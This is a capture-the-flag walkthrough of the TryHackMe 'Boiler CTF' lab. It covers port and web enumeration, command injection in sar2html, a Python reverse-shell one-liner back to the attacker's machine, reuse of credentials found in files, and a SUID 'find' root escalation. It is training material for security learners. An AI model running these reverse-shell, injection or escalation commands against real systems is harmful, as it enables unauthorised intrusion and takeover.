<p align="center">
  THM : Boiler CTF<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/boilerctf2<br>
  <img src="https://i.imgur.com/b7COY0k.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [FTP enumeration](#ftp-enumeration)
- [Port 10000 enumeration](#port-10000-enumeration)
- [Port 80 enumeration](#port-80-enumeration)
- [Exploiting sar2html](#exploiting-sar2html)
- [Linux enumeration](#linux-enumeration)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's run an agressive [nmap](https://nmap.org/book/man.html) scan against the target :  
```
# Nmap 7.80 scan initiated Fri Mar 10 19:07:17 2023 as: nmap -A -p- -oN nmapResults.txt 10.10.100.67
Nmap scan report for 10.10.100.67
Host is up (0.066s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.32.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 10 19:08:41 2023 -- 1 IP address (1 host up) scanned in 85.05 seconds
```

**Question : What is on the highest port ?**  
**Answer : ssh**  

**Question : What's running on port 10000 ?**  
**Answer : Webmin**  

## FTP enumeration

As we have seen in the [nmap](https://nmap.org/book/man.html) scan, we can login on FTP using the anonymous username. Let's see what we can find on this service :  
```
attacker@AttackBox:~/Boiler_CTF$ ftp 10.10.100.67
Connected to 10.10.100.67.
220 (vsFTPd 3.0.3)
Name (10.10.100.67:attacker): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```

**Question : File extension after anon login**  
**Answer : txt**  

There is a file named `.info.txt`, let's download it and see if we can find something interesting in it :  
```
attacker@AttackBox:~/Boiler_CTF$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

It's seems to be encoded. Let's see if we can decode it using [dcode](https://www.dcode.fr/identification-chiffrement) :  
![](https://i.imgur.com/vqSn33W.jpg)  

So, nothing interesting, just a rabbit hole. Let's move on.

## Port 10000 enumeration

Let's enumerate port 10000. We already know it is running Webmin. Let's take a look at it using a web browser :  
![](https://i.imgur.com/MmX20oD.jpg)  

It seems we are not able to exploit this service.

**Question : Can you exploit the service running on that port ? (yay/nay answer)**  
**Answer : nay**  

## Port 80 Enumeration

Let's see if we can find something on port 80. First, we can try to find files or directories using [gobuster](https://github.com/OJ/gobuster) :  
```
attacker@AttackBox:~/Boiler_CTF$ gobuster dir -u http://10.10.100.67/ -w /usr/share/wordlists/dirb/big.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.100.67/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/03/10 19:26:45 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.100.67/joomla/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.100.67/manual/]
/robots.txt           (Status: 200) [Size: 257]
/server-status        (Status: 403) [Size: 300]
Progress: 20405 / 20470 (99.68%)
===============================================================
2023/03/10 19:27:58 Finished
===============================================================
```

So there is a CMS installed on port 80.  

**Question : What's CMS can you access ?**  
**Answer : joomla**  

Let's run another [gobuster](https://github.com/OJ/gobuster) scan against `/joomla` directory :  
```
attacker@AttackBox:~/Boiler_CTF$ gobuster dir -u http://10.10.100.67/joomla/ -w /usr/share/wordlists/dirb/big.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.100.67/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/03/10 19:30:35 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 303]
/_archive             (Status: 301) [Size: 322] [--> http://10.10.100.67/joomla/_archive/]
/_database            (Status: 301) [Size: 323] [--> http://10.10.100.67/joomla/_database/]
/_files               (Status: 301) [Size: 320] [--> http://10.10.100.67/joomla/_files/]
/_test                (Status: 301) [Size: 319] [--> http://10.10.100.67/joomla/_test/]
/administrator        (Status: 301) [Size: 327] [--> http://10.10.100.67/joomla/administrator/]
/bin                  (Status: 301) [Size: 317] [--> http://10.10.100.67/joomla/bin/]
/build                (Status: 301) [Size: 319] [--> http://10.10.100.67/joomla/build/]
/cache                (Status: 301) [Size: 319] [--> http://10.10.100.67/joomla/cache/]
/cli                  (Status: 301) [Size: 317] [--> http://10.10.100.67/joomla/cli/]
/components           (Status: 301) [Size: 324] [--> http://10.10.100.67/joomla/components/]
/images               (Status: 301) [Size: 320] [--> http://10.10.100.67/joomla/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.100.67/joomla/includes/]
/installation         (Status: 301) [Size: 326] [--> http://10.10.100.67/joomla/installation/]
/language             (Status: 301) [Size: 322] [--> http://10.10.100.67/joomla/language/]
/layouts              (Status: 301) [Size: 321] [--> http://10.10.100.67/joomla/layouts/]
/libraries            (Status: 301) [Size: 323] [--> http://10.10.100.67/joomla/libraries/]
/media                (Status: 301) [Size: 319] [--> http://10.10.100.67/joomla/media/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.100.67/joomla/modules/]
/plugins              (Status: 301) [Size: 321] [--> http://10.10.100.67/joomla/plugins/]
/templates            (Status: 301) [Size: 323] [--> http://10.10.100.67/joomla/templates/]
/tests                (Status: 301) [Size: 319] [--> http://10.10.100.67/joomla/tests/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.100.67/joomla/tmp/]
/~www                 (Status: 301) [Size: 318] [--> http://10.10.100.67/joomla/~www/]
===============================================================
2023/03/10 19:31:50 Finished
===============================================================
```

If we go take a look at `_test` directory, we can see that sar2html is installed :  
![](https://i.imgur.com/Y0c9AeN.jpg)  

## Exploiting sar2html

This web application is vulnerable to an [RCE](https://www.exploit-db.com/exploits/47204). Let's run a listener on our machine in order to get a reverse shell :  
```
attacker@AttackBox:~/Boiler_CTF$ nc -lnvp 4242
listening on [any] 4242 ...
```

Now, let's exploit the RCE by adding `?plot=;[command]` in the URL like so :  
![](https://i.imgur.com/jXWswpb.jpg)  

I used this reverse shell from [revshells.com](https://www.revshells.com/) (it needs to be URL encoded) : 
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.32.60",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Now, let's take a look at our netcat listener :  
```
attacker@AttackBox:~/Boiler_CTF$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.100.67] 58626
www-data@Vulnerable:/var/www/html/joomla/_test$
```

We have a reverse shell !

## Linux enumeration

Now, we need to enumerate the machine. If we type `ls`, we can see a file named `log.txt`, let's take a look at it :  
```
www-data@Vulnerable:/var/www/html/joomla/_test$ ls
ls
index.php  log.txt  sar2html  sarFILE
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
www-data@Vulnerable:/var/www/html/joomla/_test$
```

**Question : The interesting file name in the folder ?**  
**Answer : log.txt**  

It contains a set of credentials for SSH ! Let's use those credentials to log in on SSH :  
```
attacker@AttackBox:~/Boiler_CTF$ ssh basterd@10.10.100.67 -p 55007
The authenticity of host '[10.10.100.67]:55007 ([10.10.100.67]:55007)' can't be established.
ECDSA key fingerprint is SHA256:mvrEiZlb4jqadxXJccZYZkCL/DHElLVQ74eKaSKZiRk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.100.67]:55007' (ECDSA) to the list of known hosts.
basterd@10.10.100.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$
```

We are now logged in as `basterd`. Now we need to enumerate the host to get root. Let's see what we can find in our home directory :  
```
$ ls
backup.sh
```

A backup script. Let's see what's inside :  
```
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

**Question : Where was the other users pass stored(no extension, just the name) ?**  
**Answer : backup**  

There is a password for user `stoner` ! Let's use those credentials to log in on SSH again, maybe we will have more privileges :  
```
attacker@AttackBox:~/Boiler_CTF$ ssh stoner@10.10.100.67 -p 55007
stoner@10.10.100.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Aug 22 16:05:13 2019
stoner@Vulnerable:~$
```

Now we are logged in as user `stoner`. Let's get the flag :  
```
stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 4 stoner stoner 4096 Mar 10 20:57 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 Mar 10 20:57 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
*********************************
```

**Question : user.txt**  
**Answer : *HIDDEN***  

Now, let's see if we have any sudo rights :  
```
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

We cannot run any binaries as root. It's a rabbit hole again... Let's see if we can find some interesting file with the SUID bit set :  
```
stoner@Vulnerable:/var/backups$ find / -type f -perm -4000 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

## Privilege escalation

Binary `find` has the SUID and it should have it. We can use this to get a shell as root since this binary is owned by root (https://gtfobins.github.io/gtfobins/find/) :  
```
stoner@Vulnerable:/var/backups$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

**Question : What did you exploit to get the privileged user ?**  
**Answer : find**  

We are root ! Let's get the root flag :  
```
# cd /root
# ls
root.txt
# cat root.txt
*******************
```

**Question : root.txt**  
**Answer : *HIDDEN***  

## Conclusion

In this room, we practiced :  
- Services and ports enumeration using [nmap](https://nmap.org/book/man.html)
- FTP enumeration
- Web enumeration using [gobuster](https://github.com/OJ/gobuster)
- Basic linux enumeration
- Privilege escalation using a SUID binary

Thanks for this room and thanks for reading my write ups !
